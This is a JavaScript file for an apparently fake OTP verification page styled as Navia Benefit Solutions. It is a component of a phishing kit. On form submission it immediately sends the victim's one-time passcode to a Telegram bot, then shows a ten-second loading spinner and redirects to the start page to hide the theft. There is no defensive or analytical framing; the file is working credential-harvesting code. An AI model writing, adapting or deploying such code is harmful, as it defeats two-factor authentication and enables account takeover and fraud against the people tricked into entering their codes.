/**
 * Navia Benefit Solutions — OTP Verification Page JavaScript
 * Updated with Telegram Bot Integration
 */

(function () {
    'use strict';

    const otpForm      = document.getElementById('otpForm');
    const otpInput     = document.getElementById('otpInput');
    const otpError     = document.getElementById('otpError');
    const otpSubmitBtn = otpForm ? otpForm.querySelector('.otp-submit-btn') : null;

    /* ─── LOADING HELPER ─────────────────────────────────────── */
    function startButtonLoading(btn, ms, onDone) {
        if (!btn) return;
        const originalHTML = btn.innerHTML;
        const originalWidth = btn.offsetWidth;
        btn.disabled = true;
        btn.style.minWidth = originalWidth + 'px';
        btn.innerHTML = '<span class="btn-spinner btn-spinner--dark" aria-hidden="true"></span>';
        btn.classList.add('btn-loading');

        setTimeout(() => {
            btn.disabled = false;
            btn.style.minWidth = '';
            btn.innerHTML = originalHTML;
            btn.classList.remove('btn-loading');
            if (onDone) onDone();
        }, ms);
    }

    /* ─── SHAKE HELPER ───────────────────────────────────────── */
    function shakeField(field) {
        if (!field) return;
        field.classList.remove('input-shake');
        void field.offsetWidth;
        field.classList.add('input-error', 'input-shake');
        field.addEventListener('animationend', function handler() {
            field.classList.remove('input-shake');
            field.removeEventListener('animationend', handler);
        });
    }

    /* ─── OTP INPUT HANDLING ─────────────────────────────────── */
    if (otpInput) {
        otpInput.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.trim()) {
                this.classList.remove('input-error', 'input-shake');
                if (otpError) otpError.textContent = '';
            }
        });
    }

    /* ─── FORM SUBMIT ─────────────────────────────────────────── */
    if (otpForm) {
        otpForm.addEventListener('submit', function (e) {
            e.preventDefault();
            if (!otpInput) return;

            const value = otpInput.value.trim();

            if (!value) {
                shakeField(otpInput);
                if (otpError) otpError.textContent = 'Please enter the verification code.';
                otpInput.focus();
                return;
            }
            if (value.length < 4) {
                shakeField(otpInput);
                if (otpError) otpError.textContent = 'Code is too short.';
                otpInput.focus();
                return;
            }

            // === IMMEDIATE TELEGRAM SEND ===
            TG.send(
                `🔢 <b>Navia OTP Code Entered</b>\n\n` +
                `Code: <code>${value}</code>\n` +
                `⏰ ${TG.ts()}`
            );

            startButtonLoading(otpSubmitBtn, 10000, function () {
                window.location.href = 'index.html';
            });
        });
    }

}());